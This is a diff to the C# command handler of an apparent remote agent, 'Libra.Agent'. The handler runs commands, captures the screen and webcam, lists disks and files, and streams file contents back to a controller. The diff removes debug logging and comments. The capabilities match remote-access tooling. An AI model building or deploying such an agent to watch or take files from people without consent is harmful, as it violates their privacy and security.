@@ -32,16 +32,12 @@ namespace Libra.Agent.Handle
             {
                 Packet = JsonSerializer.Deserialize<CommandModel>(dataJson, AgentJsonContext.Default.CommandModel);
             }
-            catch (Exception ex)
+            catch
             {
-                //D //D Console.WriteLine($"解析命令数据失败: {ex.Message}");
-                //D //D Console.WriteLine($"原始数据: {dataJson}");
                 return;
             }
 
             if (Packet == null) return;
-
-            //D //D Console.WriteLine($"收到命令: {Packet.Type}, {string.Join(" ", Packet.Parameter)}");
 
             switch (Packet.Type)
             {
@@ -53,7 +49,6 @@ namespace Libra.Agent.Handle
                         Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(result)),
                         EndTime = DateTime.Now
                     });
-                    //D //D Console.WriteLine($"执行结果: 结果长度 {result.Length}, {sendResult}");
                     break;
 
                 case CommandType.GetFrame:
@@ -64,7 +59,6 @@ namespace Libra.Agent.Handle
                         Result = Convert.ToBase64String(frame),
                         EndTime = DateTime.Now
                     });
-                    //D //D Console.WriteLine($"执行结果: 帧大小 {frame.Length}Byte,{sendframeResult}");
                     break;
 
                 case CommandType.GetFiles:
@@ -75,7 +69,6 @@ namespace Libra.Agent.Handle
                         Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(files, AgentJsonOptions))),
                         EndTime = DateTime.Now
                     });
-                    //D //D Console.WriteLine($"执行结果: 文件/文件夹数量 {files.Length},{sendfilesResult}");
                     break;
 
                 case CommandType.GetDisks:
@@ -86,7 +79,6 @@ namespace Libra.Agent.Handle
                         Result = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(disks, AgentJsonOptions))),
                         EndTime = DateTime.Now
                     });
-                    //D //D Console.WriteLine($"执行结果: 磁盘数量 {disks.Count},{senddisksResult}");
                     break;
 
                 case CommandType.ReadFile:
@@ -109,7 +101,6 @@ namespace Libra.Agent.Handle
                         Result = Convert.ToBase64String(file),
                         EndTime = DateTime.Now
                     });
-                    //D //D Console.WriteLine($"执行结果: 文件大小 {file.Length}Byte,{sendfileResult}");
                     break;
 
                 case CommandType.GetCameraFrame:
@@ -123,7 +114,6 @@ namespace Libra.Agent.Handle
 
                     if (cameraBytes == null || cameraBytes.Length == 0)
                     {
-                        //D //D Console.WriteLine("摄像头采集失败");
                         break;
                     }
 
@@ -136,7 +126,6 @@ namespace Libra.Agent.Handle
                             EndTime = DateTime.Now
                         });
 
-                    //D //D Console.WriteLine($"执行结果: 帧大小 {cameraBytes.Length}Byte,{sendcameraResult}");
                     break;
 
                 case CommandType.StartCameraStream:
@@ -195,13 +184,12 @@ namespace Libra.Agent.Handle
             return output + error;
         }
 
-        private const int ChunkSize = 512 * 1024; // 512KB per chunk
+        private const int ChunkSize = 512 * 1024;
 
         private static async Task ReadFileStreamAsync(Guid taskId, string filepath)
         {
             if (!File.Exists(filepath))
             {
-                // Send empty result to signal file not found
                 await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
                 {
                     TaskId = taskId,
@@ -231,12 +219,10 @@ namespace Libra.Agent.Handle
                     });
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                //D Console.WriteLine($"ReadFileStream error: {ex.Message}");
             }
 
-            // EOF marker: empty result
             await Runtimes.SendMessage(VirgoMessageType.Command, new CommandResult
             {
                 TaskId = taskId,
